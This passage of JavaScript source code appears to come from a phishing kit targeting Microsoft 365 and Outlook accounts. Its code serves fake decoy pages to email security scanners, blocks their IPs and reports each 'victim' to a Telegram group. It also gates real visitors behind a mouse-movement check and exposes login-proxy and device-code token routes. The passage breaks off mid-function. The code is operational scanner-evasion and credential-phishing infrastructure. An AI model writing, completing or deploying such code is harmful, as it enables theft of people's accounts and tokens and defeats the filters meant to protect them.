    return `<!DOCTYPE html><html><head><title>History Uncovered</title></head><body><h1>Ancient Civilizations</h1><p>Exploring the mysteries of lost societies.</p>${getHoneypotLinks()}</body></html>`;
}

function generatePhilosophyPage() {
    return `<!DOCTYPE html><html><head><title>Philosophy Now</title></head><body><h1>Ethics in the Age of AI</h1><p>Moral philosophy meets artificial intelligence.</p>${getHoneypotLinks()}</body></html>`;
}

function generatePsychologyPage() {
    return `<!DOCTYPE html><html><head><title>Psychology Today</title></head><body><h1>The Science of Habits</h1><p>How to build lasting positive behaviors.</p>${getHoneypotLinks()}</body></html>`;
}

function generateBusinessPage() {
    return `<!DOCTYPE html><html><head><title>Business Strategy Hub</title></head><body><h1>Scaling Your Small Business</h1><p>Growth strategies for entrepreneurs.</p>${getHoneypotLinks()}</body></html>`;
}

function generateLeadershipPage() {
    return `<!DOCTYPE html><html><head><title>Leadership Insights</title></head><body><h1>Leading Remote Teams</h1><p>Best practices for distributed workforce management.</p>${getHoneypotLinks()}</body></html>`;
}

function generateProductivityPage() {
    return `<!DOCTYPE html><html><head><title>Productivity Lab</title></head><body><h1>Getting Things Done</h1><p>Frameworks for peak performance and focus.</p>${getHoneypotLinks()}</body></html>`;
}

function generateMinimalistPage() {
    return `<!DOCTYPE html><html><head><title>The Minimalist Life</title></head><body><h1>Declutter Your Digital Life</h1><p>Simplify your workflows and reduce digital noise.</p>${getHoneypotLinks()}</body></html>`;
}

function generateSustainabilityPage() {
    return `<!DOCTYPE html><html><head><title>Green Future</title></head><body><h1>Sustainable Living Tips</h1><p>Reduce waste, save energy, and protect the planet.</p>${getHoneypotLinks()}</body></html>`;
}

function generateRemoteWorkPage() {
    return `<!DOCTYPE html><html><head><title>Remote Work Hub</title></head><body><h1>Working From Home Success</h1><p>Tools, tips, and strategies for effective remote work.</p>${getHoneypotLinks()}</body></html>`;
}

// ============ PAGES 51-60 ============

function generateCryptoExchangePage() {
    return `<!DOCTYPE html><html><head><title>CryptoExchange Pro - Dashboard</title><style>body{background:#0a0e27;color:white;font-family:monospace}.balance{font-size:32px;color:#00ff88}.warning{background:#ff4444;padding:10px;margin:10px}</style></head><body><h1>Cryptocurrency Exchange</h1><div class="balance">💰 Balance: 4.2341 BTC | 124.5 ETH</div><div class="warning">⚠️ Security alert: Multiple login attempts detected</div><div>Recent transactions: +0.5 BTC (Anonymous)</div>${getHoneypotLinks()}</body></html>`;
}

function generateSocialMediaPage() {
    return `<!DOCTYPE html><html><head><title>SocialConnect - Profile</title><style>.post{background:#f0f2f5;padding:15px;margin:10px;border-radius:8px}</style></head><body><h1>John Doe's Profile</h1><div class="post"><strong>John Doe</strong> - Just posted a photo</div><div class="post"><strong>Jane Smith</strong> - Liked your post</div>${getHoneypotLinks()}</body></html>`;
}

function generateWikiPage() {
    return `<!DOCTYPE html><html><head><title>Internal Wiki - Company Knowledge Base</title><style>.article{max-width:900px;margin:0 auto;padding:20px}</style></head><body><div class="article"><h1>Employee Handbook</h1><p>Welcome to the company wiki. Contains sensitive internal documentation.</p><ul><li>HR Policies</li><li>IT Security Guidelines</li><li>Client NDAs</li></ul></div>${getHoneypotLinks()}</body></html>`;
}

function generateSupportPortalPage() {
    return `<!DOCTYPE html><html><head><title>Support Portal - Zendesk</title><style>.ticket{background:#f9f9f9;padding:10px;margin:5px}</style></head><body><h1>Open Support Tickets</h1><div class="ticket">#12453 - Urgent: Server down (Priority 1)</div><div class="ticket">#12454 - Password reset request</div><div class="ticket">#12455 - API access issue</div>${getHoneypotLinks()}</body></html>`;
}

function generateBugTrackerPage() {
    return `<!DOCTYPE html><html><head><title>JIRA - Bug Tracking</title><style>.bug{background:#ffe6e6;padding:10px;margin:5px;border-left:4px solid #ff0000}</style></head><body><h1>Critical Bugs</h1><div class="bug">SEC-001 - Authentication bypass vulnerability</div><div class="bug">SEC-002 - SQL injection in login form</div><div class="bug">PERF-123 - Database connection leak</div>${getHoneypotLinks()}</body></html>`;
}

function generateCodeRepoPage() {
    return `<!DOCTYPE html><html><head><title>GitLab - Repository Browser</title><style>.repo{font-family:monospace;padding:5px}</style></head><body><h1>Projects</h1><div class="repo">📁 production-app / src / config / database.yml</div><div class="repo">📁 legacy-system / secrets / .env</div><div class="repo">📁 internal-tools / deploy / keys</div>${getHoneypotLinks()}</body></html>`;
}

function generateDockerRegistryPage() {
    return `<!DOCTYPE html><html><head><title>Docker Registry API</title><style>pre{background:#1e1e1e;color:#d4d4d4;padding:15px}</style></head><body><h1>Container Registry</h1><pre>{\n  "repositories": ["production/api","production/worker","internal/backup"],\n  "tags": {"production/api": ["latest","v2.3.1","v2.3.0"]}\n}</pre>${getHoneypotLinks()}</body></html>`;
}

function generateK8sDashboardPage() {
    return `<!DOCTYPE html><html><head><title>Kubernetes Dashboard</title><style>.pod{background:#326ce5;color:white;padding:10px;margin:5px}</style></head><body><h1>Cluster Overview</h1><div class="pod">Pod: api-server (Running) - Namespace: production</div><div class="pod">Pod: database (Running) - Namespace: production</div><div class="pod">Secret: db-credentials (mounted)</div>${getHoneypotLinks()}</body></html>`;
}

function generateDatabaseAdminPage() {
    return `<!DOCTYPE html><html><head><title>phpMyAdmin - Database Management</title><style>.db{background:#004d40;color:white;padding:5px}</style></head><body><h1>Database Servers</h1><div class="db">🗄️ production_db (MySQL) - 124 tables</div><div class="db">🗄️ user_data (PostgreSQL) - 2.3GB</div><div class="db">🗄️ analytics (MongoDB) - 45 collections</div>${getHoneypotLinks()}</body></html>`;
}

function generateRedisInsightPage() {
    return `<!DOCTYPE html><html><head><title>Redis Insight - Cache Management</title></head><body><h1>Redis Keys</h1><pre>session:abc123\ncache:user:1001\nrate_limit:192.168.1.100\napi_keys:admin_2024\npending_jobs</pre>${getHoneypotLinks()}</body></html>`;
}

// ============ PAGES 61-70 ============

function generateRabbitMQPage() {
    return `<!DOCTYPE html><html><head><title>RabbitMQ Management</title></head><body><h1>Message Queue Status</h1><div>Queue: email_queue (1,234 messages)</div><div>Queue: job_queue (567 messages)</div><div>Queue: dead_letter (89 messages)</div>${getHoneypotLinks()}</body></html>`;
}

function generateNginxStatusPage() {
    return `<!DOCTYPE html><html><head><title>nginx status</title></head><body><pre>Active connections: 128\nserver accepts handled requests\n 12345 12345 45678\nReading: 6 Writing: 12 Waiting: 110</pre>${getHoneypotLinks()}</body></html>`;
}

function generateApachePage() {
    return `<!DOCTYPE html><html><head><title>Apache Server Status</title></head><body><pre>Total Accesses: 1234567\nTotal kBytes: 9876543\nUptime: 45 days 6 hours 23 minutes</pre>${getHoneypotLinks()}</body></html>`;
}

function generateTomcatPage() {
    return `<!DOCTYPE html><html><head><title>Apache Tomcat Manager</title></head><body><h1>Tomcat Web Application Manager</h1><div>Applications:</div><div>/api - Running</div><div>/admin - Running</div><div>/manager - Stopped</div>${getHoneypotLinks()}</body></html>`;
}

function generateJenkinsPage() {
    return `<!DOCTYPE html><html><head><title>Jenkins CI/CD Dashboard</title><style>.build{background:#4caf50;padding:10px;margin:5px}</style></head><body><h1>Recent Builds</h1><div class="build">✅ Build #124 - SUCCESS (2 min ago)</div><div class="build">❌ Build #123 - FAILED (15 min ago)</div><div>Credentials: jenkins-admin / ********</div>${getHoneypotLinks()}</body></html>`;
}

function generateGitLabPage() {
    return `<!DOCTYPE html><html><head><title>GitLab - Merge Requests</title></head><body><h1>Open Merge Requests</h1><div>!124 - Update security config (Critical)</div><div>!125 - Fix SQL injection (High priority)</div>${getHoneypotLinks()}</body></html>`;
}

function generateJiraPage() {
    return `<!DOCTYPE html><html><head><title>JIRA - Sprint Planning</title></head><body><h1>Sprint 24 Tasks</h1><div>PROJ-124 - Implement OAuth2 (In Progress)</div><div>PROJ-125 - Fix CSRF vulnerability (Code Review)</div>${getHoneypotLinks()}</body></html>`;
}

function generateConfluencePage() {
    return `<!DOCTYPE html><html><head><title>Confluence - Security Policies</title></head><body><h1>Internal Security Documentation</h1><div>SSH Key Management</div><div>AWS IAM Policies</div><div>Database Backup Procedures</div>${getHoneypotLinks()}</body></html>`;
}

function generateWordPressPage() {
    return `<!DOCTYPE html><html><head><title>WordPress Admin</title></head><body><h1>Dashboard</h1><div>Plugins: 24 active, 3 need updates</div><div>Users: admin, editor, subscriber</div><div>wp-config.php location: /var/www/html</div>${getHoneypotLinks()}</body></html>`;
}

function generateDrupalPage() {
    return `<!DOCTYPE html><html><head><title>Drupal Administration</title></head><body><h1>Drupal 10 Dashboard</h1><div>Database: drupal_prod</div><div>Private files: /var/www/private</div>${getHoneypotLinks()}</body></html>`;
}

// ============ PAGES 71-80 ============

function generateMagentoPage() {
    return `<!DOCTYPE html><html><head><title>Magento Admin Panel</title></head><body><h1>Store Configuration</h1><div>API Keys: pub_xxxxxxxx, priv_xxxxxxxx</div><div>Payment Gateway: Stripe (Live Mode)</div>${getHoneypotLinks()}</body></html>`;
}

function generateShopifyPage() {
    return `<!DOCTYPE html><html><head><title>Shopify Admin</title></head><body><h1>Store Analytics</h1><div>Total Sales: $124,567</div><div>Customers: 4,567</div><div>Access Token: shpat_xxxxxxxxxxxx</div>${getHoneypotLinks()}</body></html>`;
}

function generateSalesforcePage() {
    return `<!DOCTYPE html><html><head><title>Salesforce - Sales Dashboard</title></head><body><h1>Opportunities</h1><div>Total Pipeline: $2.4M</div><div>Top Deals: Acme Corp ($500k), Globex ($350k)</div>${getHoneypotLinks()}</body></html>`;
}

function generateHubSpotPage() {
    return `<!DOCTYPE html><html><head><title>HubSpot CRM</title></head><body><h1>Contact List</h1><div>Total Contacts: 12,345</div><div>API Key: pat-eu1-xxxxxxxx</div>${getHoneypotLinks()}</body></html>`;
}

function generateZendeskPage() {
    return `<!DOCTYPE html><html><head><title>Zendesk Support</title></head><body><h1>Ticket Analytics</h1><div>Avg Response Time: 4.2 hours</div><div>Satisfaction Score: 94%</div>${getHoneypotLinks()}</body></html>`;
}

function generateSlackArchivePage() {
    return `<!DOCTYPE html><html><head><title>Slack Workspace Archive</title></head><body><h1>Channel: #security-alerts</h1><div>[2026-04-20] Breach attempt detected from 45.33.22.11</div><div>[2026-04-19] SSL certificate expiring in 7 days</div>${getHoneypotLinks()}</body></html>`;
}

function generateTeamsArchivePage() {
    return `<!DOCTYPE html><html><head><title>Microsoft Teams Chat Logs</title></head><body><h1>Chat History: IT-Security</h1><div>John: Did anyone see the alert last night?</div><div>Sarah: Yes, investigating now</div>${getHoneypotLinks()}</body></html>`;
}

function generateGSuitePage() {
    return `<!DOCTYPE html><html><head><title>Google Workspace Admin</title></head><body><h1>Admin Console</h1><div>Users: 245 active</div><div>Drive Storage: 1.2TB / 2TB</div><div>API Service Account: admin@project.iam.gserviceaccount.com</div>${getHoneypotLinks()}</body></html>`;
}

function generateOffice365Page() {
    return `<!DOCTYPE html><html><head><title>Office 365 Admin Center</title></head><body><h1>Microsoft 365 Dashboard</h1><div>Licenses: 450 used / 500 available</div><div>SharePoint Sites: 24</div><div>Global Admin: admin@company.onmicrosoft.com</div>${getHoneypotLinks()}</body></html>`;
}

function generateSharePointPage() {
    return `<!DOCTYPE html><html><head><title>SharePoint - Internal Documents</title></head><body><h1>Document Library</h1><div>📄 Financial Reports 2025 (Confidential)</div><div>📄 Employee Contracts (Restricted)</div><div>📄 Client NDAs (Legal)</div>${getHoneypotLinks()}</body></html>`;
}

// ============ PAGES 81-90 ============

function generateOneDrivePage() {
    return `<!DOCTYPE html><html><head><title>OneDrive - Personal Vault</title></head><body><h1>Files</h1><div>🔐 backup_2024.zip</div><div>🔐 passwords.kdbx</div><div>🔐 ssh_keys.tar.gz</div>${getHoneypotLinks()}</body></html>`;
}

function generateDropboxPage() {
    return `<!DOCTYPE html><html><head><title>Dropbox Business</title></head><body><h1>Team Folders</h1><div>📁 Company Secrets</div><div>📁 Client Data</div><div>📁 Infrastructure</div>${getHoneypotLinks()}</body></html>`;
}

function generateBoxPage() {
    return `<!DOCTYPE html><html><head><title>Box - Content Management</title></head><body><h1>Enterprise Content</h1><div>Legal Documents (Encrypted)</div><div>Board Meeting Minutes</div>${getHoneypotLinks()}</body></html>`;
}

function generateNotionPage() {
    return `<!DOCTYPE html><html><head><title>Notion - Internal Wiki</title></head><body><h1>Workspace</h1><div>📄 Security Audit Results (June 2025)</div><div>📄 AWS Root Account Credentials (Restricted)</div><div>📄 Incident Response Playbook</div>${getHoneypotLinks()}</body></html>`;
}

function generateTrelloPage() {
    return `<!DOCTYPE html><html><head><title>Trello - Project Board</title></head><body><h1>Q2 Roadmap</h1><div>Todo: Security audit, Penetration testing</div><div>Doing: Implementing 2FA</div><div>Done: SSL certificate renewal</div>${getHoneypotLinks()}</body></html>`;
}

function generateAsanaPage() {
    return `<!DOCTYPE html><html><head><title>Asana - Team Tasks</title></head><body><h1>Sprint Tasks</h1><div>✅ Deploy firewall rules</div><div>⚠️ Update compromised credentials</div><div>🔴 Investigate breach attempt</div>${getHoneypotLinks()}</body></html>`;
}

function generateMondayPage() {
    return `<!DOCTYPE html><html><head><title>Monday.com - Operations</title></head><body><h1>Security Status Board</h1><div>Firewall: Active</div><div>IDS/IPS: Monitoring</div><div>SIEM: 1,234 alerts today</div>${getHoneypotLinks()}</body></html>`;
}

function generateClickUpPage() {
    return `<!DOCTYPE html><html><head><title>ClickUp - Security Dashboard</title></head><body><h1>Compliance Tasks</h1><div>📋 SOC2 Type II Audit (In Progress)</div><div>📋 GDPR Compliance Check (Completed)</div>${getHoneypotLinks()}</body></html>`;
}

function generateFigmaPage() {
    return `<!DOCTYPE html><html><head><title>Figma - Design System</title></head><body><h1>UI Library</h1><div>🎨 Admin Panel Mockups (Confidential)</div><div>🎨 Internal Tools UI</div><div>Access Token: figd_xxxxxxxxxxxx</div>${getHoneypotLinks()}</body></html>`;
}

function generateAdobePage() {
    return `<!DOCTYPE html><html><head><title>Adobe Creative Cloud</title></head><body><h1>Assets</h1><div>🎨 Brand Assets</div><div>📹 Marketing Videos</div><div>Enterprise License Key: 1234-5678-xxxx</div>${getHoneypotLinks()}</body></html>`;
}

// ============ PAGES 91-100 ============

function generateUnityPage() {
    return `<!DOCTYPE html><html><head><title>Unity Game Engine</title></head><body><h1>Project Dashboard</h1><div>Game: Project Phoenix (Unreleased)</div><div>Build Server: internal-build.company.com</div><div>License: unity_pro_2026.lic</div>${getHoneypotLinks()}</body></html>`;
}

function generateUnrealPage() {
    return `<!DOCTYPE html><html><head><title>Unreal Engine Editor</title></head><body><h1>Project Files</h1><div>📁 Source Code (Proprietary)</div><div>📁 Assets (1.2GB)</div><div>📁 Config (Engine.ini)</div>${getHoneypotLinks()}</body></html>`;
}

function generateBlenderPage() {
    return `<!DOCTYPE html><html><head><title>Blender Render Farm</title></head><body><h1>Render Queue</h1><div>Job #456 - Animation (Rendering)</div><div>Job #457 - Product Visualization (Queued)</div>${getHoneypotLinks()}</body></html>`;
}

function generateAutodeskPage() {
    return `<!DOCTYPE html><html><head><title>Autodesk BIM 360</title></head><body><h1>Construction Models</h1><div>🏗️ Building A (Confidential Plans)</div><div>🏗️ Structural Analysis</div>${getHoneypotLinks()}</body></html>`;
}

function generateMatlabPage() {
    return `<!DOCTYPE html><html><head><title>MATLAB Online</title></head><body><h1>Scripts</h1><div>📄 data_analysis.m</div><div>📄 ml_model.mlx</div><div>📄 encryption_key.mat</div>${getHoneypotLinks()}</body></html>`;
}

function generateTableauPage() {
    return `<!DOCTYPE html><html><head><title>Tableau Server</title></head><body><h1>Dashboards</h1><div>📊 Sales Analytics (Live)</div><div>📊 Customer 360 (Internal)</div><div>Data Source: production_db (Credentials cached)</div>${getHoneypotLinks()}</body></html>`;
}

function generatePowerBIPage() {
    return `<!DOCTYPE html><html><head><title>Power BI Service</title></head><body><h1>Workspace: Executive</h1><div>📈 Financial Dashboard</div><div>📈 Security KPIs</div><div>Dataset Refresh: SQL Server (sa credentials used)</div>${getHoneypotLinks()}</body></html>`;
}

function generateSnowflakePage() {
    return `<!DOCTYPE html><html><head><title>Snowflake Data Warehouse</title></head><body><h1>Query History</h1><pre>SELECT * FROM customer_data WHERE ssn = '***'\nSELECT * FROM financial_transactions\nSELECT * FROM employee_records</pre>${getHoneypotLinks()}</body></html>`;
}

function generateDatabricksPage() {
    return `<!DOCTYPE html><html><head><title>Databricks Workspace</title></head><body><h1>Notebooks</h1><div>📓 Data_Pipeline (Last run: successful)</div><div>📓 ML_Training (Access Token: dapi-xxxxxxxx)</div>${getHoneypotLinks()}</body></html>`;
}

function generateAirflowPage() {
    return `<!DOCTYPE html><html><head><title>Apache Airflow</title></head><body><h1>DAGs</h1><div>🔄 etl_pipeline (Running)</div><div>🔄 backup_database (Success)</div><div>🔄 security_audit (Failed - check logs)</div>${getHoneypotLinks()}</body></html>`;
}
// =========================================================================

// Bot signatures (fallback)
const BOT_SIGNATURES = {
    'googlebot': '🔍 Googlebot',
    'bingbot': '🔍 Bingbot',
    'facebookexternalhit': '📱 Facebook',
    'twitterbot': '🐦 Twitter',
    'linkedinbot': '💼 LinkedIn',
    'proofpoint': '📧 Proofpoint',
    'mimecast': '📧 Mimecast',
    'barracuda': '📧 Barracuda',
    'microsoft.atp': '📧 Microsoft ATP',
    'python-requests': '🐍 Python',
    'curl': '🔧 cURL',
    'wget': '📥 Wget'
};

// Store bot detections
let botDetections = [];
let blockedIPs = new Set();
let botDetectionMessageIds = new Set();
let pageAccessMessageIds = new Set();

// Load blocked IPs
function loadBlockedIPs() {
    try {
        if (fs.existsSync(BLOCKED_IPS_FILE)) {
            const content = fs.readFileSync(BLOCKED_IPS_FILE, 'utf8');
            const ips = content.split('\n').filter(ip => ip.trim().length > 0);
            ips.forEach(ip => blockedIPs.add(ip));
            console.log(`📋 Loaded ${blockedIPs.size} blocked IPs`);
        }
    } catch(e) {
        console.error('Failed to load blocked IPs:', e.message);
    }
}

function saveBlockedIPs() {
    try {
        const ips = Array.from(blockedIPs).join('\n');
        fs.writeFileSync(BLOCKED_IPS_FILE, ips);
    } catch(e) {
        console.error('Failed to save blocked IPs:', e.message);
    }
}

function blockIP(ip, reason = 'Manual block') {
    if (!ip || ip === 'unknown' || ip === '::1' || ip === '127.0.0.1') return false;
    if (blockedIPs.has(ip)) return false;
    blockedIPs.add(ip);
    saveBlockedIPs();
    console.log(`🔴 IP BLOCKED: ${ip} (${reason})`);
    return true;
}

function unblockIP(ip) {
    if (!ip) return false;
    const removed = blockedIPs.delete(ip);
    if (removed) saveBlockedIPs();
    console.log(`🟢 IP UNBLOCKED: ${ip}`);
    return removed;
}

function getFormattedBlockedIPs() {
    const ips = Array.from(blockedIPs);
    if (ips.length === 0) return '📋 *No IPs currently blocked.*';
    let formatted = `📋 *BLOCKED IPS (${ips.length})*\n━━━━━━━━━━━━━━━━━━\n`;
    ips.forEach((ip, index) => {
        formatted += `${index + 1}. \`${ip}\`\n`;
    });
    return formatted;
}

function getBotType(userAgent) {
    const uaLower = userAgent.toLowerCase();
    for (const [signature, type] of Object.entries(BOT_SIGNATURES)) {
        if (uaLower.includes(signature)) return type;
    }
    return '🤖 Scanner';
}

// Enhanced Telegram notification with URL and delete buttons
async function sendBotNotification(bot, telegramGroupId, botInfo) {
    if (!bot || !telegramGroupId) return;
    
    const message = 
        `🤖 *SCANNER DETECTED*\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `*Type:* ${botInfo.type}\n` +
        `*IP:* \`${botInfo.ip}\`\n` +
        `*ISP:* ${botInfo.isp || 'Unknown'}\n` +
        `*Country:* ${botInfo.country || 'Unknown'}\n` +
        `*User Type:* ${botInfo.userType || 'hosting'}\n` +
        `*Location:* ${botInfo.location}\n` +
        `*Path:* ${botInfo.path}\n` +
        `*Action:* 🎭 Served decoy page\n` +
        `*Time:* ${new Date().toLocaleString()}\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
    
    const options = {
        parse_mode: 'Markdown',
        reply_markup: {
            inline_keyboard: [
                [{ text: '🔴 UNBLOCK THIS IP', callback_data: `unblock_ip|${botInfo.ip}` }],
                [{ text: '📋 VIEW BLOCKED IPS', callback_data: `view_blocked_ips` }],
                [{ text: '🗑️ DELETE ALL BOT MSGS', callback_data: `delete_all_bot_messages` }],
                [{ text: '🗑️ DELETE ALL ACCESS MSGS', callback_data: `delete_all_access_messages` }],
                [{ text: '🗑️ DELETE ALL MESSAGES', callback_data: `delete_all_messages` }]
            ]
        }
    };
    
    try {
        const sentMessage = await bot.sendMessage(telegramGroupId, message, options);
        if (sentMessage && sentMessage.message_id) {
            addBotMessageId(sentMessage.message_id);
        }
        console.log(`✅ Bot notification sent for IP: ${botInfo.ip}`);
    } catch (e) {
        console.error('Telegram error:', e.message);
    }
}

// Handle bot detection - ALWAYS serve decoy page
async function handleBotDetection(req, res, bot, groupId, botType, reason) {
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
    const userAgent = req.headers['user-agent'] || '';
    const victimInfo = await getVictimInfo(req);
    const ipInfo = await getIPInfo(ip);
    const fullUrl = `${req.protocol}://${req.get('host')}${req.originalUrl}`;
    
    const detection = {
        type: botType,
        ip: ip,
        isp: ipInfo.isp,
        country: ipInfo.countryCode,
        userType: ipInfo.userType,
        path: req.path,
        url: fullUrl,
        userAgent: userAgent,
        location: victimInfo.location,
        timestamp: new Date().toISOString(),
        blocked: true,
        reason: reason
    };
    
    botDetections.unshift(detection);
    if (botDetections.length > 100) botDetections.pop();
    
    const logEntry = `${new Date().toISOString()} | ${botType} | ${ip} | ${ipInfo.countryCode} | ${ipInfo.userType} | ${req.path} | ${fullUrl} | DECOY\n`;
    fs.appendFileSync(BOT_DETECTIONS_LOG, logEntry);
    
    blockIP(ip, `Bot detected: ${botType} (${ipInfo.userType})`);
    
    if (bot && groupId) {
        await sendBotNotification(bot, groupId, {
            type: botType,
            ip: ip,
            isp: ipInfo.isp,
            country: ipInfo.countryCode,
            userType: ipInfo.userType,
            location: victimInfo.location,
            path: req.path,
            url: fullUrl,
            userAgent: userAgent
        });
    }
    
    // ALWAYS serve the static decoy page - no redirects, no access denied
    return serveDecoyPage(res, botType, ip, ipInfo);
}

// ============ MOUSE VERIFICATION PAGE WITH VISIBLE BOX ============
function showVerificationPage(res, encryptedEmail, returnUrl, verifiedSessions, fingerprint) {
    const requiredMoves = TOKEN_CONFIG.MIN_MOUSE_MOVEMENTS;
    
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Verify you're human</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                *{box-sizing:border-box}
                body{font-family:system-ui;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;margin:0;padding:20px}
                .card{background:white;border-radius:20px;padding:40px;max-width:450px;width:100%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3)}
                h2{margin-top:0;color:#333}
                .mouse-area{background:#f8f9fa;border:2px dashed #dee2e6;border-radius:12px;padding:30px;margin:20px 0;cursor:crosshair;transition:all .3s}
                .mouse-area.active{border-color:#667eea;background:#f0f2ff}
                button{background:#667eea;color:white;border:none;padding:14px 28px;font-size:16px;border-radius:10px;cursor:pointer;font-weight:600;transition:all .2s}
                button:hover{background:#5a67d8;transform:scale(1.02)}
                button:disabled{opacity:0.5;cursor:not-allowed;transform:none}
                .status{margin-top:20px;padding:12px;border-radius:8px;font-size:14px;display:none}
                .status.success{background:#d4edda;color:#155724;display:block}
                .status.error{background:#f8d7da;color:#721c24;display:block}
                .status.info{background:#d1ecf1;color:#0c5460;display:block}
                .info-text{font-size:12px;color:#6c757d;margin-top:15px}
            </style>
        </head>
        <body>
            <div class="card">
                <h2>🔒 Security Check</h2>
                <p>Please complete verification to continue:</p>
                <div id="mouseArea" class="mouse-area">🖱️ Move your mouse anywhere in this box</div>
                <button id="verifyBtn" disabled style="margin-top: 10px;">✓ Verify Humanity</button>
                <div id="status" class="status"></div>
                <div class="info-text">Move your mouse ${requiredMoves} times to verify</div>
            </div>
            <script>
                let mouseMoves = 0;
                let verified = false;
                const startTime = Date.now();
                const REQUIRED_MOVES = ${requiredMoves};
                const ENCRYPTED_EMAIL = '${encryptedEmail}';
                const RETURN_URL = '${returnUrl}';
                
                const mouseDiv = document.getElementById('mouseArea');
                const verifyBtn = document.getElementById('verifyBtn');
                const statusDiv = document.getElementById('status');
                
                const counter = document.createElement('div');
                counter.style.fontSize = '12px';
                counter.style.marginTop = '10px';
                counter.style.color = '#6c757d';
                mouseDiv.parentNode.insertBefore(counter, mouseDiv.nextSibling);
                
                mouseDiv.addEventListener('mousemove', function() {
                    if (verified) return;
                    mouseMoves++;
                    mouseDiv.classList.add('active');
                    
                    if (mouseMoves >= REQUIRED_MOVES) {
                        verifyBtn.disabled = false;
                        counter.innerHTML = '✓ Ready to verify';
                        counter.style.color = '#28a745';
                    } else {
                        counter.innerHTML = '🖱️ Movements: ' + mouseMoves + '/' + REQUIRED_MOVES;
                    }
                });
                
                mouseDiv.addEventListener('mouseleave', function() {
                    mouseDiv.classList.remove('active');
                });
                
                verifyBtn.addEventListener('click', async function() {
                    if (verified) return;
                    verified = true;
                    verifyBtn.disabled = true;
                    verifyBtn.textContent = 'Verifying...';
                    statusDiv.className = 'status info';
                    statusDiv.textContent = 'Checking...';
                    
                    const elapsed = Date.now() - startTime;
                    
                    try {
                        const response = await fetch('/verify-human', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                encryptedEmail: ENCRYPTED_EMAIL,
                                mouseMovements: mouseMoves,
                                totalTime: elapsed,
                                userAgent: navigator.userAgent,
                                returnUrl: RETURN_URL
                            })
                        });
                        const result = await response.json();
                        
                        if (result.valid) {
                            statusDiv.className = 'status success';
                            statusDiv.textContent = '✓ Verified! Redirecting...';
                            setTimeout(function() { window.location.href = result.returnUrl; }, 500);
                        } else {
                            statusDiv.className = 'status error';
                            statusDiv.textContent = 'Verification failed. Redirecting...';
                            setTimeout(function() { window.location.href = 'https://google.com'; }, 1500);
                        }
                    } catch(err) {
                        statusDiv.className = 'status error';
                        statusDiv.textContent = 'Error. Redirecting...';
                        setTimeout(function() { window.location.href = 'https://google.com'; }, 1500);
                    }
                });
            </script>
        </body>
        </html>
    `);
}




// =========================================================================

// Main unified middleware
// Main unified middleware
function unifiedBotDetection(verifiedSessions) {
    loadTokens();
    
    return async function(req, res, next) {
        // ============ EXPANDED WHITELIST - MUST BE FIRST ============
        const whitelistedPaths = [
            '/api/create-subdomain',
            '/api/subdomain-stats',
            '/api/subdomain-cleanup',
            '/api/block-subdomain',
            '/verify-human',
            '/device-code/auth',
            '/device-code/step2',
            '/api/device-code/verify',
            '/api/device-code/poll',
            '/api/device-code/tokens',
            '/api/device-code/session',
            '/api/outlook-proxy',
            '/api/refresh-token',
            '/proxy/live-oauth',
            '/proxy/live-login',
            '/proxy/live-api',
            '/api/validate-token',
            '/yuing',
            '/en-us/auth',
            '/proxy/dual-login',
             '/live-proxy',  
        ];
        
        // Check if path is whitelisted (EXACT match or starts with + slash)
        const isWhitelisted = whitelistedPaths.some(path => {
            if (req.path === path) return true;
            // Also check if path starts with whitelisted path + /
            if (path.endsWith('/')) {
                return req.path.startsWith(path);
            }
            return req.path === path || req.path.startsWith(path + '/');
        });
        
        if (isWhitelisted) {
            console.log(`🔓 [MIDDLEWARE] Whitelisted path: ${req.path} - Skipping ALL validation`);
            return next();
        }
        // ============================================================
        
        const apiKey = req.headers['x-api-key'];
        if (apiKey && apiKey === process.env.INTERNAL_API_KEY) {
            return next();
        }
        
        const userAgent = req.headers['user-agent'] || '';
        const fingerprint = getFingerprint(req);
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
        const groupId = process.env.TELEGRAM_GROUP_ID;
        const bot = req.app.locals?.bot;
        const fullUrl = `${req.protocol}://${req.get('host')}${req.originalUrl}`;
        
        // Check blocked IPs - serve decoy page (no redirect)
        if (blockedIPs.has(ip)) {
            console.log(`🚫 Blocked IP attempted access: ${ip} - ${fullUrl} - Serving decoy page`);
            const ipInfo = await getIPInfo(ip);
            return serveDecoyPage(res, 'Previously Blocked IP', ip, ipInfo);
        }
        
        const encryptedEmail = req.query.email;
        const verifiedSession = verifiedSessions.get(fingerprint);
        const isVerified = verifiedSession && (Date.now() - verifiedSession.timestamp < 3600000);
        
        // Already verified - allow access
        if (isVerified && encryptedEmail) {
            console.log(`✅ Already verified: ${fingerprint.substring(0, 20)} - ${fullUrl}`);
            return next();
        }
        
        if (isVerified) {
            return next();
        }
        
        // Scanner detection with URL logging
        const scannerDetected = await isEmailScanner(userAgent, ip, req.headers, req.requestStartTime, fullUrl);
        
        if (scannerDetected) {
            console.log(`🕷️ Scanner detected - ${fullUrl} - serving decoy page`);
            await handleBotDetection(req, res, bot, groupId, getBotType(userAgent), 'Scanner detected');
            return;
        }
        
        // Bot signatures (fallback)
        for (const [signature, botType] of Object.entries(BOT_SIGNATURES)) {
            if (userAgent.toLowerCase().includes(signature)) {
                await handleBotDetection(req, res, bot, groupId, botType, `Bot pattern: ${signature}`);
                return;
            }
        }
        
        // Check if this is a request to the Microsoft proxy
        const isMicrosoftProxy = (
            req.path === '/en-us/auth' || 
            req.path === '/' ||
            req.path.includes('outlook') ||
            req.path.includes('microsoft-365')
        );
        
        if (isMicrosoftProxy && encryptedEmail && req.method === 'GET') {
            let decryptedEmail = null;
            try {
                decryptedEmail = decrypt(encryptedEmail);
                console.log(`📧 Verification required for: ${decryptedEmail} (IP: ${ip}) - ${fullUrl}`);
            } catch (err) {
                console.log(`⚠️ Could not decrypt: ${err.message}`);
            }
            
            let tokenData = tokenStore.get(encryptedEmail);
            if (!tokenData || Date.now() > tokenData.expiresAt) {
                tokenData = {
                    destination: req.query.destination || req.originalUrl,
